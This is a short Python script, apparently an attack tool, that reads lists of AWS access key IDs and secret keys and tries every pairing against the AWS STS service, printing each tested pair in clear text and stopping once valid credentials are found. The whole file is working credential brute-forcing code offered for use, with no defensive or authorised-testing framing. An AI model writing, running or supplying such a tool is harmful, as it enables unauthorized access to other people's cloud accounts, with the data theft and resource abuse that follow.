import boto3
from botocore.exceptions import ClientError, NoCredentialsError, EndpointConnectionError
import time

def try_aws_key(access_key, secret_key):
    try:
        client = boto3.client(
            'sts',
            aws_access_key_id=access_key,
            aws_secret_access_key=secret_key
        )
        identity = client.get_caller_identity()
        print(f"[+] SUCCESS: {access_key}:{secret_key}")
        print(f"    -> Account: {identity['Account']}, UserID: {identity['UserId']}")
        return True
    except ClientError as e:
        print(f"[-] FAILED: {access_key}:{secret_key} - {e.response['Error']['Code']}")
    except Exception as e:
        print(f"[!] ERROR: {access_key}:{secret_key} - {str(e)}")
    return False

def main():
    access_key_file = input("Enter path to Access Key ID list: ").strip()
    secret_key_file = input("Enter path to Secret Key list: ").strip()

    try:
        with open(access_key_file, 'r') as f1:
            access_keys = [line.strip() for line in f1 if line.strip()]
        with open(secret_key_file, 'r') as f2:
            secret_keys = [line.strip() for line in f2 if line.strip()]
    except FileNotFoundError:
        print("Key file(s) not found.")
        return

    start_time = time.time()
    for access_key in access_keys:
        for secret_key in secret_keys:
            if try_aws_key(access_key, secret_key):
                print("[*] Valid credentials found. Stopping.")
                return
    print("Brute-force finished.")
    print(f"Took {time.time() - start_time:.2f} seconds")

if __name__ == "__main__":
    main()
